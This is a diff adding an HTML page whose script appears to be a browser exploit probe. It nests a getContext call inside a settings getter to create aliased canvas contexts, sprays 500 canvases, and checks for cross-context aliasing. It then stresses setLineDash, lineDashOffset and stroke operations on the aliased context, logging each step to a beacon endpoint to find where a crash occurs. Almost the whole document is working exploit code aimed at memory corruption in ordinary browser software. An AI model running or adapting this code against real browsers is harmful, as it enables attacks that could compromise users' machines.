@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V959B</title></head>
+<body><pre id="out">V959B — alias lineDash realloc/offset/stroke oracle (single run, B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var RUN='r'+Date.now().toString(36)+Math.random().toString(36).slice(2,6);
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){try{new Image().src='/beacon/V959B-'+tag+'?d='+encodeURIComponent(String(body==null?'':body).slice(0,700))+'&run='+encodeURIComponent(RUN)+'&t='+Date.now()+'&s=1';}catch(e){}}
+window.onerror=function(msg,src,line){ bk('ERR','onerror:'+String(msg)+'@'+line); };
+window.onunhandledrejection=function(e){ bk('ERR','unhandled:'+String(e&&e.reason)); };
+function snap(ctx,stage){
+  try{
+    var ld=ctx.getLineDash();
+    var off=('lineDashOffset' in ctx)?ctx.lineDashOffset:'na';
+    var tail=ld.length?ld[ld.length-1]:'-';
+    bk(stage,'len='+ld.length+'|v0='+(ld.length?ld[0]:'-')+'|tail='+tail+'|off='+off+'|lw='+ctx.lineWidth);
+    return true;
+  }catch(e){ bk(stage+'-EX',String(e&&e.name)+':'+String(e&&e.message||e).slice(0,140)); return false; }
+}
+function step(preTag,preData,fn,okTag){
+  bk(preTag,preData);
+  try{ fn(); }catch(e){ bk(preTag+'-CATCH',String(e&&e.name)+':'+String(e).slice(0,120)); }
+  return snap(al,okTag);
+}
+function mkDash(n,base){ var a=[]; for(var i=0;i<n;i++) a.push(base+i+0.25); return a; }
+var al=null;
+async function establishAlias(){
+  bk('BOOT','single-run realloc/oracle; run='+RUN+'; crash=last PRE/CATCH without OK');
+  var inner=null;
+  var c=document.createElement('canvas'); c.width=64; c.height=64;
+  var settings={};
+  Object.defineProperty(settings,'alpha',{get:function(){ try{ inner=c.getContext('2d'); }catch(e){} return true; }});
+  try{ c.getContext('bitmaprenderer', settings); }catch(e){ bk('BMR-ERR',String(e&&e.name)); }
+  if(!inner){ bk('NO-INNER',''); return false; }
+  bk('INNER','ok');
+  var spray=[];
+  for(var i=0;i<500;i++){
+    var c2=document.createElement('canvas'); c2.width=64; c2.height=64;
+    var g=c2.getContext('2d'); g.lineWidth = 1000 + i; spray.push({c:c2,g:g});
+  }
+  bk('SPRAY','500');
+  var found=-1;
+  try{ inner.lineWidth=8888.88; }catch(e){ bk('W1-ERR',String(e)); return false; }
+  for(var i=0;i<spray.length;i++){
+    try{ if(Math.abs(spray[i].g.lineWidth-8888.88)<0.01){ found=i; al=spray[i].g; break; } }catch(e){}
+  }
+  bk('ALIAS', found>=0?('idx='+found):'MISS');
+  return found>=0;
+}
+(async function(){
+  if(!(await establishAlias())){ bk('DONE','no-alias/stop'); say('no alias'); return; }
+  step('S0-PRE','setLineDash([1,2,3,4]) off=0', function(){ al.setLineDash([1,2,3,4]); if('lineDashOffset' in al) al.lineDashOffset=0; }, 'S0-OK');
+  var offs=[0,1,7.5,-3,1000,1e12,NaN,Infinity];
+  for(var i=0;i<offs.length;i++){
+    (function(i,ov){ step('S1-'+i+'-PRE','off='+String(ov), function(){ if('lineDashOffset' in al) al.lineDashOffset=ov; }, 'S1-'+i+'-OK'); })(i,offs[i]);
+  }
+  step('S2a-PRE','256', function(){ al.setLineDash(mkDash(256,1)); }, 'S2a-OK');
+  step('S2b-PRE','1024', function(){ al.setLineDash(mkDash(1024,10)); }, 'S2b-OK');
+  step('S3a-PRE','8', function(){ al.setLineDash(mkDash(8,5)); }, 'S3a-OK');
+  step('S3b-PRE','[]', function(){ al.setLineDash([]); }, 'S3b-OK');
+  step('S3c-PRE','[9,9]', function(){ al.setLineDash([9,9]); }, 'S3c-OK');
+  bk('S4-PRE','bigDash+stroke+smallDash+stroke');
+  try{
+    al.setLineDash(mkDash(512,3));
+    al.beginPath(); al.moveTo(0,0); al.lineTo(64,64); al.stroke();
+    snap(al,'S4a-OK');
+    al.setLineDash([2,4]);
+    al.beginPath(); al.moveTo(64,0); al.lineTo(0,64); al.stroke();
+    snap(al,'S4b-OK');
+  }catch(e){ bk('S4-CATCH',String(e)); }
+  bk('S5-PRE','rect ops');
+  try{
+    al.setLineDash(mkDash(128,7));
+    al.strokeRect(1,1,30,30); al.fillRect(2,2,10,10);
+    al.setLineDash([]); al.strokeRect(5,5,20,20);
+  }catch(e){ bk('S5-CATCH',String(e)); }
+  snap(al,'S5-OK');
+  bk('DONE','single-run complete; if you saw a tab/browser crash earlier, report it');
+  say('done run='+RUN);
+})();
+</script>
+</body></html>
